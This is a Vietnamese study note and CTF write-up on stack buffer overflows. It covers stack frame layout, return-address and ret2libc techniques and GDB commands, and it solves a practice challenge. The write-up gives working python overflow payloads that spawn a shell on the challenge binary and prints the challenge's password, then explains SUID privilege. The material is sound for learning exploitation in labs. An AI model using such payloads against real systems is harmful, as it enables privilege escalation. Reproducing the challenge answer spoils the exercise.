## I. Buffer Overflow
### 1. Bản chất lỗ hổng
- Xảy ra khi chương trình nhận dữ liệu vượt kích thước bộ đệm khi dùng các hàm như: gets, strcpy, strcat, scanf("%s") ghi đè lên vùng nhớ khác
### 2. Cấu trúc Stack Frame
- Lưu data tạm thời cho hàm từ địa chỉ cao xuống địa chỉ thấp, gồm:<br>
  + Tham số truyền vào hàm<br>
  + Địa chỉ trả về: địa chỉ lệnh tiếp theo khi hàm kết thúc<br>
  + EBP cũ: con trỏ lưu trạng thái hàm trước đó<br>
  + Biến cục bộ: mảng buffer nhập data
### 3. Kỹ thuật khai thác
- Ghi đè biến cục bộ
  - Đầy buffer -> data thừa sẽ thay đổi biến cạnh đó (data cần nhập ngược lại)
  - VD: python -c 'print "a"*16 + "\x05\x03\x02\x01"' | ./stack2
- Ghi đè địa chỉ trả về
  - Công thức: buffer + 4 byte EBP + địa chỉ mới
  - gets gặp 0x0A (enter) sẽ ngắt và đổi thành 0x00 -> không để payload có 0x0A
- Gọi hàm hệ thống: ghi đè địa chỉ trả về trỏ tới hàm system()
  - Công thức: buffer + EBP + địa chỉ hàm system + địa chỉ hàm exit + địa chỉ chứa tham số cho system
### 4. Công cụ GDB
- objdump -d <tên_file>: Phân tích mã máy hợp ngữ
- disas <tên_hàm>: Xem mã hợp ngữ của hàm
- info frame: Xem cấu trúc khung ngăn xếp hiện tại (địa chỉ EBP, EIP)
- x &variable: Xem địa chỉ bộ nhớ chứa biến đó

## II. Write up
- Phân tích code:
  - buf: mảng 40 giá trị nhưng fgets cho phép nhập 45 giá trị
  - Khi dữ liệu nhập vào tràn nó sẽ tràn sang biến check và sau đó là var
  - Điều cần làm là ghi đè giá trị biến check: 0x04030201 -> 0xdeadbeef
<img width="756" height="587" alt="image" src="https://github.com/user-attachments/assets/9a0ddcab-8423-4791-a2f8-23c461fe2bab" /><br>
- Xây dựng payload: python -c 'print("a"*40 + "\xef\xbe\xad\xde")' | ./ch13
- Nếu dùng python3 -> payload: python3 -c 'import sys; sys.stdout.buffer.write(b"a"*40 + b"\xef\xbe\xad\xde")' | ./ch13
<img width="814" height="177" alt="image" src="https://github.com/user-attachments/assets/d05ef38e-e9ae-4dc5-b005-24580519d018" /><br>
- Nhưng shell đã bị đóng lại và tôi không thể đọc file .passwd -> sửa payload: (python -c 'print("a"*40 + "\xef\xbe\xad\xde")'; cat) | ./ch13
<img width="879" height="183" alt="image" src="https://github.com/user-attachments/assets/d1cde4b7-f17f-46d5-af60-2fa206f43031" /><br>
- As: 1w4ntm0r3pr0np1s
## III. SUID
- Vì sao chạy file ch13 lại có thể đọc file .passwd?
<img width="769" height="242" alt="image" src="https://github.com/user-attachments/assets/da83fbe5-989e-43f5-af4b-b8bd2299db71" /><br>
- File .passwd chỉ có app-systeme-ch13-cracked mới có quyền đọc
- May thay, file ch13 có SUID (s) -> nó sẽ chạy với quyền của chủ sở hữu = app-systeme-ch13-cracked thay vì app-systeme-ch13 nên nó có quyền đọc file .passwd
